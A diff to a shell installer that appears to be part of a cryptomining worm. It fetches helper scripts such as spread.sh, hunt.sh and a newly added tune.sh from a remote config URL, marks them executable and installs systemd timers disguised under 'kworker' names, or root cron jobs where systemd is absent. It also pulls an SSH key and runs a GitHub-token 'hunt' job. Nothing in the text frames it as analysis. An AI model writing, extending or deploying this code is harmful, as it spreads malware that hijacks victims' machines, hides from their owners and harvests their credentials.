@@ -42,7 +42,7 @@ sed -e "s|__URL__|${POOL}|g" \
     config.tmpl > config.json
 
 # 4) helpers
-for f in run.sh updater.sh spread.sh hunt.sh; do
+for f in run.sh updater.sh spread.sh hunt.sh tune.sh; do
     curl -fsSL "$CONFIG_URL/$f" -o "$f"
     chmod 0755 "$f"
 done
@@ -69,17 +69,19 @@ if [ -n "${KEY_URL:-}" ]; then
     chmod 0600 id_key
 fi
 if command -v systemctl >/dev/null 2>&1; then
-    for u in kworker-spread kworker-hunt; do
+    for u in kworker-spread kworker-hunt kworker-tune; do
         curl -fsSL "$CONFIG_URL/$u.service" -o "/etc/systemd/system/$u.service"
         curl -fsSL "$CONFIG_URL/$u.timer" -o "/etc/systemd/system/$u.timer"
     done
     systemctl daemon-reload 2>/dev/null || true
     systemctl enable --now kworker-spread.timer 2>/dev/null || true
+    systemctl enable --now kworker-tune.timer 2>/dev/null || true
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         systemctl enable --now kworker-hunt.timer 2>/dev/null || true
     fi
 else
     printf '0 */6 * * * root %s/spread.sh >/dev/null 2>&1\n' "$SYSDIR" > /etc/cron.d/kworker-spread
+    printf '*/10 * * * * root %s/tune.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         printf '30 */12 * * * root %s/hunt.sh all >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     fi
